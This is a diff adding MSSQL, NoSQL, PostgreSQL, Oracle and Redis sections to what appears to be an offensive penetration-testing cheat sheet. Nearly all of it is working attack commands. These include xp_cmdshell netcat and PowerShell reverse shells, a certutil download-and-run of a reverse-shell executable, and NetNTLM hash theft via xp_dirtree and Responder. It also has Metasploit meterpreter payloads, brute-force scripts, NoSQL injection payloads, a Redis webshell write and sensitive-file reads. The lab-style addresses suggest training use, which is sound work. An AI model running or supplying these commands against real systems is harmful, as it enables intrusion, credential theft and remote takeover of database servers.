@@ -234,4 +234,198 @@ Write SSH Key into authorized_keys2 file
 mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
 ```
 
+## MSSQL
+```
+Connect to the DB:
+sqsh -S 192.168.0.x -U username -P password
+mssqlclient.py user:password@192.168.0.x -db mydb -port 27900
+impacket-mssqlclient -windows-auth 'domain/web_svc@10.10.80.x'        
+
+XP_cmdshell
+Enabling xp_cmdshell feature
+SQL> EXECUTE sp_configure 'show advanced options', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE;
+SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE;
+
+One Liner:
+EXECUTE sp_configure 'show advanced options', 1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+
+Since we have full control over the system, we can now easily upgrade our SQL shell to a more standard reverse shell.
+
+Get a reverse shell:
+xp_cmdshell C:\windows\tasks\nc.exe 192.168.45.x 8888 -e cmd
+' EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.208/80.exe C:\Users\Public\80.exe'-- <-- Download an exe revshell. 
+' EXEC xp_cmdshell 'powershell C:\Users\Public\80.exe'-- <-- Execute your revshell with powershell.
+
+base64
+powershell encoded base64 reverse shell
+SQL> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY
+
+netcat
+xp_cmdshell C:\windows\tasks\nc.exe 192.168.45.x 8888 -e cmd
+
+Search for registry passwords from mssql
+We search the registry hoping to find any plaintext passwords.
+reg query HKLM /f pass /t REG_SZ /s
+
+Nmap
+nmap scripts
+nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip
+
+Bruteforce
+nmap -n -v -sV -Pn -p 1433 –script ms-sql-brute –script-args userdb=users.txt,passdb=passwords.txt $ip
+
+MSSQL Server + Responder
+UNC Path Injection
+Uniform Naming Convention allows the sharing of resources on a network via a very precise syntax: \IP-Server\shareName\Folder\File
+launch responder : responder -I eth0
+EXEC master..xp_dirtree \"\\\\192.168.1.x\\\\evil\";
+1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';--
+
+[+] Attacking MSSQL with Metasploit
+[>] Enumerate MSSQL Servers on the network:
+msf > use auxiliary/scanner/mssql/mssql_ping
+nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
+
+[>] Bruteforce MSSQL Database:
+msf auxiliary(mssql_login) > use auxiliary/scanner/mssql/mssql_login
+
+[>] Enumerate MSSQL Database:
+msf > use auxiliary/admin/mssql/mssql_enum
+
+[>] Gain shell using gathered credentials
+msf > use exploit/windows/mssql/mssql_payload
+msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
+
+Steal NetNTLM Hash /Relay Attack
+SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
+```
+
+# NoSQL (MongoDB, CouchDB)
+```
+bash
+# Tools
+# https://github.com/codingo/NoSQLMap
+python NoSQLMap.py
+# https://github.com/torque59/Nosql-Exploitation-Framework
+python nosqlframework.py -h
+# https://github.com/Charlie-belmer/nosqli
+nosqli scan -t http://localhost:4000/user/lookup?username=test
+# https://github.com/FSecureLABS/N1QLMap
+./n1qlMap.py http://localhost:3000 --request example_request_1.txt --keyword beer-sample --extract travel-sample
+
+# Payload: 
+' || 'a'=='a
+
+mongodbserver:port/status?text=1
+
+# in URL
+username[$ne]=toto&password[$ne]=toto
+
+##in JSON
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt":""}, "password": {"$gt":""}}
+
+- Trigger MongoDB syntax error -> ' " \ ; { }
+- Insert logic -> ' || '1' == '1' ; //
+- Comment out -> //
+- Operators -> $where $gt $lt $ne $regex
+- Mongo commands -> db.getCollectionNames()
+```
+
+## PostGreSQL
+```
+PostgreSQL
+$ psql
+$ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
+
+common commands
+postgres=# \c
+postgres=# \list
+postgres=# \c  <DATABASE>
+<DATABASE>=# \dt
+<DATABASE>=# \du
+<DATABASE>=# TABLE <TABLE>;
+<DATABASE>=# SELECT * FROM users;
+<DATABASE>=# \q
+
+$ psql -h 192.168.174.56 -p 5432 -U postgres
+
+Look for local listening active ports, if you see postgress you can chisel it
+$ psql -h 127.0.0.1 -U postgres -W
+
+Port 5437 is running postgresql version between 11.3 - 11.7. I was able to login with the default credentials of 
+postgres:postgres using psql.
+
+ psql -h 192.168.51.47 -U postgres -p 5437
+ 
+ As we are running on a version of postgresql higher than 9.3 we should be able to use the following exploit to gain command execution on the target machine.
+ https://www.exploit-db.com/exploits/46813
+```
+
+## Oracle
+```
+Oracle
+Install oscanner:
+apt-get install oscanner  
+
+Run oscanner:
+oscanner -s 192.168.1.200 -P 1521 
+
+Fingerprint Oracle TNS Version:
+Install tnscmd10g:
+apt-get install tnscmd10g
+
+Fingerprint oracle tns:
+tnscmd10g version -h TARGET
+nmap --script=oracle-tns-version 
+
+Brute force oracle user accounts:
+Identify default Oracle accounts:
+ nmap --script=oracle-sid-brute 
+ nmap --script=oracle-brute 
+
+Run nmap scripts against Oracle TNS:
+nmap -p 1521 -A TARGET
+```
+
+## Redis
+```
+Redis
+Redis is an open source, in-memory data structure store, used as a database, cache and message broker.
+If redis is open and we have its credential we can login from cli
+
+    redis-cli -h $ip -a 'password'
+
+-NOAUTH command to check if authorization is required or not
+
+    keys * (this command list the dbcontents)
+
+    lrange db_keyname 1 100 (if type command doesnt display the contents )
+
+    Enumerating files
+    eval dofile("/etc/passwd") 0
+    eval "dofile('c:\\users\\path')" 0
+
+    dumping redid db file
+    eval dofile('/var/data/app/db.conf');return(db.password); 0
+
+Getting rce through redis
+we can get webshell through redis if we have write access to a directory whithin web root or accessible by some other means
+
+    nc -nv $ip port
+
+10.85.0.52:6379> config set dir /usr/share/nginx/html OK 10.85.0.52:6379> config set dbfilename redis.php OK 10.85.0.52:6379> set test "" # Our code goes here OK 10.85.0.52:6379> save OK
+
+Or the eval dofile allows us to read system sensitive files via redis
+
+redis-cli -h 10.10.188.12 -p 6379 eval "dofile('C:\\Users\\enterprise-security\\Desktop\\user.txt')" 0
+
+we can also use netcat to connect to redis
+
+    nc $ip port
+```
 
